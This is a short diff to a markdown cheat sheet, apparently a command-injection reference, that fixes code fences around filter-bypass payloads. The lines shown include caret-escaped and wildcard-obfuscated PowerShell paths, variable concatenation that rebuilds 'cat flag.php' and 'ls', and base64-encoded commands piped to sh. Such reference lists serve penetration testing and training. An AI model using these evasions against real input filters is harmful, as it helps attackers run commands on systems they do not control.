@@ -162,12 +162,14 @@ powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
 ```
 ### Bypass with =
-```a=fl;b=ag.php;cat $a$b      
+```
+a=fl;b=ag.php;cat $a$b      
 a=l;b=s;$a$b
 ```
 
 #### Bypass with base64
-````echo d2hvYW1p|base64 -d` 
+```
+`echo d2hvYW1p|base64 -d` 
 echo Y2F0IGluZGV4LnBocAo=|base64 -d|sh
 ```
 
